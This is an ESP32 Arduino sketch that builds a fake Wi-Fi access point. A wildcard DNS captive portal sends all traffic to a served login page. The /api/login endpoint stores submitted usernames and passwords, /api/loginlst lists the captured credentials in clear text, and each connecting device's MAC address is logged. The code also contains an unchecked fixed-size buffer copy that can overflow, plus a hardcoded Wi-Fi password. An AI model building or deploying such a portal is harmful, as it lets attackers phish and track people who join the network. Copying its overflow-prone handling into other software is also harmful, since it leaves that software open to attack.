#include <SPIFFS.h>
#include <dummy.h>
#include "ESPAsyncWebServer.h"
#include "ESPmDNS.h"
#include <DNSServer.h>
#include <AsyncTCP.h>
#include <ArduinoJson.h>

#include <ETH.h>


const char* ssid     = "Keyce-Formateurs";
const char* password = "Kitgame2022!";

const byte DNS_PORT = 53;
DNSServer dnsServer;


static bool eth_connected = false;

AsyncWebServer server(80);

typedef struct {
  String mac;
  int id;
  int nbrAttempt;
} dataMac;

typedef struct {
  int id;
  String username;
  String pwd;
} dataLogin;

dataMac dataMacList[30];

dataLogin dataLoginList[30];

int dataMacIndex = 0;

int dataLoginIndex = 0;

int dataMacId = 1;



void setup() {
  Serial.begin(115200);
  while (!Serial) {}
  delay(5000);
  

  Serial.println("Serial OK");

  if (!SPIFFS.begin(true)) {
    Serial.println("An Error has occurred while mounting SPIFFS");
    return;
  }

  WiFi.onEvent(WiFiEvent);

  WiFi.onEvent(WiFiStationConnected, SYSTEM_EVENT_AP_STACONNECTED);

  WiFi.mode(WIFI_AP);

  WiFi.softAP(ssid, password);

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  ETH.begin(); 

  server.on("/", HTTP_GET, [](AsyncWebServerRequest * request) {
    Serial.println("I'm here !!!");
    request->send(SPIFFS, "/index.html", "text/html");
  });

  server.on("/api/test", HTTP_GET, [](AsyncWebServerRequest * request) {
    String data = getData();
    request->send(200, "application/json", data);
  });

  server.on("/api/loginlst", HTTP_GET, [](AsyncWebServerRequest * request) {
    String data = getLogin();
    request->send(200, "application/json", data);
  });

  server.on("/api/login", HTTP_POST, [](AsyncWebServerRequest * request) {}, NULL,
    [](AsyncWebServerRequest * request, uint8_t *data, size_t len, size_t index, size_t total) {

    char json[155] = "";
    size_t i;
    for (i = 0; i < len; i++) {
      json[i] = data[i];
    }
    json[i+1] = '\0';

    const int capacity = JSON_OBJECT_SIZE(2);
    StaticJsonDocument<capacity> doc;

    DeserializationError error = deserializeJson(doc, json);

    // Test if parsing succeeds.
    if (error) {
      Serial.print(F("deserializeJson() failed: "));
      Serial.println(error.f_str());
      return;
    }

    dataLoginList[dataLoginIndex].id = dataMacId++;
    String username = doc["username"];
    dataLoginList[dataLoginIndex].username = username;
    String pwd = doc["password"];
    dataLoginList[dataLoginIndex].pwd = pwd; 
  
    if(++dataLoginIndex == 30) {
      dataMacIndex = 0;
    }
  });

  server.onNotFound( [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/index.html", "text/html");
  });

  server.serveStatic("/", SPIFFS, "/");

  server.begin();
}



void loop() {  
  dnsServer.processNextRequest();
}



void WiFiEvent(WiFiEvent_t event)
{
  switch (event) {
    case SYSTEM_EVENT_ETH_START:
      Serial.println("ETH Started");
      //set eth hostname here
      ETH.setHostname("ETH-HOSTNAME");
      break;
    case SYSTEM_EVENT_ETH_CONNECTED:
      {
        Serial.println("ETH Connected");
        break;
      }
    case SYSTEM_EVENT_ETH_GOT_IP:
      {
        Serial.print("ETH MAC: ");
        Serial.print(ETH.macAddress());
        Serial.print(", IPv4: ");
        Serial.print(ETH.localIP());
        if (ETH.fullDuplex()) {
          Serial.print(", FULL_DUPLEX");
        }
        Serial.print(", ");
        Serial.print(ETH.linkSpeed());
        Serial.println("Mbps");
        eth_connected = true;
        break;
      }
    case SYSTEM_EVENT_ETH_DISCONNECTED:
      Serial.println("ETH Disconnected");
      eth_connected = false;
      break;
    case SYSTEM_EVENT_ETH_STOP:
      Serial.println("ETH Stopped");
      eth_connected = false;
      break;

    default:
      break;
  }
}

void WiFiStationConnected(WiFiEvent_t event, WiFiEventInfo_t info){
   
  Serial.println("Station connected\nMac Address : ");
  String mac = "";
   
  for(int i = 0; i< 6; i++){
    mac += String(info.sta_connected.mac[i], HEX);
    Serial.printf("%02X", info.sta_connected.mac[i]);  
    if(i<5) {
      mac += ":";
      Serial.print(":");
    }
  }
  dataMacList[dataMacIndex].mac = mac;
  dataMacList[dataMacIndex].id = dataMacId++;
  int nbrAttempt = 1; 
  for(int i = 0; (dataMacIndex != 0) && (i < dataMacIndex); i++) {
    if (mac == dataMacList[i].mac) {
      dataMacList[dataMacIndex].nbrAttempt = dataMacList[i].nbrAttempt + 1;
    }
  }

  if(++dataMacIndex == 30) {
    dataMacIndex = 0;
  }
}

String getData() {

  const int capacity = JSON_OBJECT_SIZE(5);
  StaticJsonDocument<capacity * 30> doc;
 
  JsonArray listMac = doc.createNestedArray("list");
  
  for(int i = dataMacIndex-1; i >= 0; i--) {
    StaticJsonDocument<capacity> obj;
    obj["mac"] = dataMacList[i].mac;
    obj["id"] = dataMacList[i].id;
    obj["nbrAttempt"] = dataMacList[i].nbrAttempt + 1;
    listMac.add(obj);
  }
  
  
  return doc.as<String>();
}

String getLogin() {

  const int capacity = JSON_OBJECT_SIZE(5);
  StaticJsonDocument<capacity * 30> doc;
 
  JsonArray listLogin = doc.createNestedArray("list");
  
  for(int i = dataLoginIndex-1; i >= 0; i--) {
    StaticJsonDocument<capacity> obj;
    obj["username"] = dataLoginList[i].username;
    obj["id"] = dataLoginList[i].id;
    obj["password"] = dataLoginList[i].pwd;
    listLogin.add(obj);
  }
  
  
  return doc.as<String>();
}
